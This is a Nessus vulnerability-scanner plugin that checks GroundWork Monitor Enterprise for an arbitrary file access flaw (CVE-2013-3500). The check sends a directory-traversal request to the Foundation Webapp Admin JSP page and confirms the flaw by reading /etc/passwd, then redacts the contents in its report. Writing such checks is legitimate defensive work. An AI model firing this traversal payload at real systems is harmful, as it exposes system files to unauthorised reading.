#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(67020);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_cve_id("CVE-2013-3500");
  script_bugtraq_id(58406);
  script_xref(name:"CERT", value:"345260");

  script_name(english:"GroundWork Monitor Enterprise Foundation Webapp Admin Arbitrary File Access");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host has a web application that is affected by an arbitrary
file access vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host has a version of GroundWork Monitor Enterprise
installed that has an arbitrary file access vulnerability in the
Foundation Webapp Admin interface.  By sending a specially crafted HTTP
request, it is possible for a remote attacker to read or modify files
the nagios user has access to. 

Note that installs affected by this vulnerability are most likely
affected by other vulnerabilities as well."
  );
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8bed79e0");
  # https://kb.groundworkopensource.com/login.action;jsessionid=2E43D410E8AF4B26C2699FEFF2118A64?os_destination=https%3A%2F%2Fkb.groundworkopensource.com%2Fdisplay%2FSUPPORT%2FSA%2B2013-1%2BSome%2Bweb%2Bcomponents%2Ballow%2Bbypass%2Bof%2Brole%2Baccess%2Bcontrols
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6e52b021");
  script_set_attribute(attribute:"solution", value:"See the vendor advisory for a workaround.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2013-3500");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gwos:groundwork_monitor");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("groundwork_monitor_enterprise_auth_bypass.nasl");
  script_require_keys("www/groundwork_monitor_enterprise");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:80);
get_kb_item_or_exit('www/'+port+'/groundwork_monitor_enterprise/weak_auth');

appname = "GroundWork Monitor Enterprise";

install = get_install_from_kb(appname:"groundwork_monitor_enterprise", port:port, exit_on_fail:TRUE);

dir = install['dir'];
location = build_url(qs:dir, port:port);

referer = build_url(qs:'/foundation-webapp/admin/manage-configuration.jsp', port:port);

dir_traversal = mult_str(str:'../', nb:15) + 'etc/passwd';

res = http_send_recv3(
                      port: port,
                      item: '/foundation-webapp/admin/manage-configuration.jsp?fn=' + dir_traversal,
                      method: 'GET',
                      add_headers: make_array("Referer", referer)
                      );

if (
  "Properties File:" >< res[2] &&
  "/etc/passwd" >< res[2] &&
  (res[2] =~ ":0:[01]:root:" || "/bin/bash" >< res[2])
)
{
  report = NULL;
  attach_file = NULL;
  output = NULL;
  req = http_last_sent_request();
  request = NULL;

  if (report_verbosity > 0)
  {
    passwd_file = '';

    # passwd file content is mixed in with HTML code,
    # below we try to pull it out for the report
    foreach line (split(res[2], keep:FALSE))
    {
      item = pregmatch(pattern:'<input[ ]*id="prop_([^"]+)"[^>]+value="([^"]+)"', string:line);
      # see if what we have is likely a valid passwd file entry,
      # append to passwd_file if it is
      if (
        !isnull(item) && !isnull(item[1]) && !isnull(item[2]) &&
        preg(pattern:"^[^:]+$", string:item[1]) &&
        preg(pattern:"^([^:]+:){5}[^:]+$", string:item[2])
      ) passwd_file += item[1] + ":" + item[2] + '\n';
    }

    report =
      '\nNessus was able to obtain \'/etc/passwd\' using the following' +
      '\nrequest : \n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
      req + '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1 && !empty_or_null(passwd_file))
    {
      output = data_protection::redact_etc_passwd(output:passwd_file);
      attach_file = "passwd";
      request = make_list(req);
    }
  }

  security_report_v4(port:port,
                     extra:report,
                     severity:SECURITY_HOLE,
                     request:request,
                     file:attach_file,
                     output:output);

  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, location);

